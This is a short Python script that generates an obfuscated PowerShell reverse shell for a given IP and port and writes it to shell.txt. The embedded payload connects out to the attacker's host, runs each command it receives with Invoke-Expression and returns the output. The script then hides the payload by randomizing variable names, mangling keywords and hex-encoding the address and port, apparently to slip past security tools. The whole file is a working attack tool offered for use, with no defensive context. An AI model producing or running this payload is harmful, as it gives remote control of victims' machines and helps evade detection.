
import re
import string
import random
import sys

ip = sys.argv[1]
port = sys.argv[2]

script = """$tcp=New-Object System.Net.Sockets.TCPClient('*LHOST*',*LPORT*);$stream=$tcp.GetStream();$reader=New-Object System.IO.StreamReader($stream);$writer=New-Object System.IO.StreamWriter($stream,[System.Text.Encoding]::UTF8);$writer.AutoFlush=$true;while($tcp.Connected){$data=$reader.ReadLine();if($data){try{$result=Invoke-Expression $data;if($result -is [System.Collections.IEnumerable]){$result=($result | ForEach-Object {$_.Name}) -join "`n"}$writer.WriteLine($result);$writer.Flush()}catch{ $writer.WriteLine("Error: $_");$writer.Flush()}}}"""
var_dict = {}
pattern = re.compile(r'(?!\$PSHOME)(\$[A-Za-z][A-Za-z0-9]+)')
def replace_var(match):
    var_name = match.group(1)
    if var_name not in var_dict:
        var_dict[var_name] = '$' + ''.join(random.sample(string.ascii_letters + string.digits, 10))
    return var_dict[var_name]

script = pattern.sub(replace_var, script)

pattern = re.compile(r'\biex\b')
script = pattern.sub("i''ex", script)

pattern = re.compile(r'\bPS\b')
def replace_ps(match):
    return '<:' + ''.join(random.sample(string.ascii_letters + string.digits, 10)) + ':>'

script = pattern.sub(replace_ps, script)

script = script.replace("*LHOST*", ip)
script = script.replace("*LPORT*", port)

pattern = re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}\b')
def ip_to_hex(match):
    return '0x' + ''.join('{:02x}'.format(int(x)) for x in match.group(0).split('.'))

script = pattern.sub(ip_to_hex, script)

pattern = re.compile(r'\b(?!65535)([1-9]\d{1,3}|[1-5]\d{4}|6[0-4]\d{3}|65[0-4]\d{2}|655[0-2]\d|6553[0-5])\b')
def port_to_hex(match):
    port_number = int(match.group())
    return hex(port_number)

script = pattern.sub(port_to_hex, script)

output_file = "shell.txt"

with open(output_file, 'w') as file:
    file.write(script)
